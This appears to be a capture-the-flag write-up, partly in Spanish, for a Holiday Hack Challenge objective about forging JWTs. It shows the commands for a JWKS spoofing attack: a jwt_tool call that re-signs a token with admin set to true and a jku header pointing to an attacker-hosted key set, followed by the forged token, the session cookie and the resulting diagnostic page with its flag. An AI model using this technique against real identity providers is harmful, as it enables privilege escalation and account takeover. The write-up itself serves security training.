
## Rogue Gnome Identity Provider

_Difficulty:_ 

Hey, I'm Paul! I've been at Counter Hack since 2024 and loving every minute of it. I'm a pentester who digs into web, API, and mobile apps, and I'm also a fan of Linux. When I'm not hacking away, you can catch me enjoying board games, hiking, or paddle boarding!

As a pentester, I proper love a good privilege escalation challenge, and that's exactly what we've got here.

I've got access to a Gnome's Diagnostic Interface at gnome-48371.atnascorp with the creds `gnome:SittingOnAShelf`, but it's just a low-privilege account.

The gnomes are getting some dodgy updates, and I need admin access to see what's actually going on.

Ready to help me find a way to bump up our access level, yeah?

Hint>
 Rogue Gnome IDP
_From: Santa
Objective: [Rogue Gnome Identity Provider](https://2025.holidayhackchallenge.com/badge?section=objective&id=objRogueGnome)
_
It looks like the JWT uses JWKS. Maybe a JWKS spoofing attack would work.


### teoria

A **JWKS (JSON Web Key Set) Spoofing attack** exploits the way a server validates the digital signature of a JWT.

Think of it like a fake ID card. Normally, a bouncer checks your ID against a government database. In this attack, you hand the bouncer an ID that says: _"To verify this ID, please check the database located at **https://www.google.com/search?q=my-fake-website.com**,"_ and the bouncer actually does it.



## Solucion

```
Hi, Paul here. Welcome to my web-server. I've been using it for JWT analysis.

I've discovered the Gnomes have a diagnostic interface that authenticates to an Atnas identity provider.

Unfortunately the gnome:SittingOnAShelf credentials discovered in 2015 don't have sufficient access to view the gnome diagnostic interface.

I've kept some notes in ~/notes

Can you help me gain access to the Gnome diagnostic interface and discover the name of the file the Gnome downloaded? When you identify the filename, enter it in the badge.

```

1
```
paul@paulweb:~$ sudo -l
Matching Defaults entries for paul on 3eb82a27f494:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User paul may run the following commands on 3eb82a27f494:
    (root) NOPASSWD: /usr/sbin/host-setup
    
    
sudo /usr/sbin/host-setup 
This rabbit hole seems interesting, but it leads to Wonderland, not the flag.
```

```bash
paul@paulweb:~$ cat notes 
# Sites

## Captured Gnome:
curl http://gnome-48371.atnascorp/

## ATNAS Identity Provider (IdP):
curl http://idp.atnascorp/

## My CyberChef website:
curl http://paulweb.neighborhood/
### My CyberChef site html files:
~/www/


# Credentials

## Gnome credentials (found on a post-it):
Gnome:SittingOnAShelf


# Curl Commands Used in Analysis of Gnome:

## Gnome Diagnostic Interface authentication required page:
curl http://gnome-48371.atnascorp

## Request IDP Login Page
curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth

## Authenticate to IDP
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login

## Pass Auth Token to Gnome
curl -v http://gnome-48371.atnascorp/auth?token=<insert-JWT>

## Access Gnome Diagnostic Interface
curl -H 'Cookie: session=  ' http://gnome-48371.atnascorp/diagnostic-interface

## Analyze the JWT
jwt_tool.py <insert-JWT>



```

```bash
paul@paulweb:~$ id
uid=2005(paul) gid=2000(counterhack) groups=2000(counterhack)
```



```

```




```
cp ~/.jwt_tool/jwttool_custom_jwks.json ~/www/jwks.json
```


/usr/local/bin/jwt_tool.py


## El paseo ordenado

### 1 Generamos token valido
```
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login
 
 
 

```

### 2 
```
 
 
 
 /usr/local/bin/jwt_tool.py  -X s -hc kid -hv jwt_tool -pc admin -pv true -I

   
```

### 3 
```
  curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vaHR0cGJpbi5vcmcvYmFzZTY0L2V3b2dJQ0FnSW10bGVYTWlPbHNLSUNBZ0lDQWdJQ0I3Q2lBZ0lDQWdJQ0FnSUNBZ0lDSnJkSGtpT2lKU1UwRWlMQW9nSUNBZ0lDQWdJQ0FnSUNBaWEybGtJam9pYW5kMFgzUnZiMndpTEFvZ0lDQWdJQ0FnSUNBZ0lDQWlkWE5sSWpvaWMybG5JaXdLSUNBZ0lDQWdJQ0FnSUNBZ0ltVWlPaUpCVVVGQ0lpd0tJQ0FnSUNBZ0lDQWdJQ0FnSW00aU9pSjBZMmhQVm1SWVZXYzVWRjlJVmpKbU9WUldXbVZ2U0ROSE1uVkNNalF6ZVVGaE5raG9OMUp6ZVdWUGVURjBRWE10VDBWdVJERmZOVlJYY214cVdTMVNjVzlUWm05RmFtSkZNemh5ZEZaTWNGOTNaVVJtY205SWJqaEpMVWs1YkVkMVFVRXRkMFJKTnpCelQxUnROSFJUVTBSMWQwUTVWa0pHYlZoSkxXUkdkM05VVGpRME5ubFNTbUZuWVZwUU5GcG5abEJ2Y21WUFREbGljR1pNWHpkSWVGQlBTbG94TkhveVdrcGFZVkF0TjJoeU1VaFRZWE41Vkd0clVrY3pkVFJ3ZVd4bmIxSlZkVEphVlhoWGFIRk9aekZCTjJVeFdVNVZjblJzY1dGbmIyOUdlRWRaYTFwQ1dHSkNXRXBpU0dSTlRHNHRVRk56TTNSak0zQlhVVVZSU0ZCQldVSlRSa2h1UTNwNVZFVlBSbEZQYVhob0xVOVJjVE5MZVV3MWMwaExkazlYVldoVWVVOHlWVk5QYlVwSVRGbFZZa05GWkRaZlJHWnlZMUkwVURWRlkzUjNWR3hVUlZVeGMzTllUMDVIWjNoSVFWRWlDaUFnSUNBZ0lDQWdmUW9nSUNBZ1hRcDkiLCJraWQiOiJqd3RfdG9vbCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDExODI5MCwiZXhwIjoxNzY0MTI1NDkwLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.ZO23lu1RsFAGEYszuRUJMD7uYy2XnuHgCY7wiAFeL0ZDAJ5rdVK0XRq-84pXjh6CInL6kud6-ZAuBnHpsEGAsbZEyy9CDxaBBF3I4I05gu-majz4NN2BVUftLDtY3YLiGKw2hBKT6CfXPijn6Vv0MSWb-gLFHEjhdy3boIJ_GU7Y5vJD6uYgQnu8oTq0LFiLQrS-Nl4vLax2k1SGnfA6vNpeiqfpWXRUv3_JQQBexc0I32IDziL2vulB14uVJH_FNdTYI36kvhpLZtFl6Zb-xlgL0NHBCvMPmA2UVc49KrgbBiKIaGWY6wTKPq7LSbE-ZnpSwfnetmJsfZARbuW_Yw
 
session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aSZPUg.g5hR6Yfjf3JZc_p8tSMwBQ9_Ejw
```

### 5
```
 
 
 
curl -H 'Cookie: session= eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aSc3VA.Buw40lwQCwVZg2d_T1uk5Y0_6yk' http://gnome-48371.atnascorp/diagnostic-interface

<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp : Gnome Diagnostic Interface</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
<h1>AtnasCorp : Gnome Diagnostic Interface</h1>
<div style='display:flex; justify-content:center; gap:10px;'>
<img src='/camera-feed' style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0;' />
<div style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0; display:flex; align-items:flex-start; justify-content:flex-start; text-align:left;'>
System Log<br/>
2025-11-26 11:33:50: Movement detected.<br/>
2025-11-26 15:39:05: AtnasCorp C&C connection restored.<br/>
2025-11-26 17:20:33: Checking for updates.<br/>
2025-11-26 17:20:33: Firmware Update available: refrigeration-botnet.bin<br/>
2025-11-26 17:20:35: Firmware update downloaded.<br/>
2025-11-26 17:20:35: Gnome will reboot to apply firmware update in one hour.</div>
</div>
<div class="statuscheck">
    <div class="status-container">
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Live Camera Feed</span>
        </div>
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Network Connection</span>
        </div>
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Connectivity to Atnas C&C</span>
        </div>
    </div>
</div>

</body>
</html> 
 
 ```

refrigeration-botnet.bin
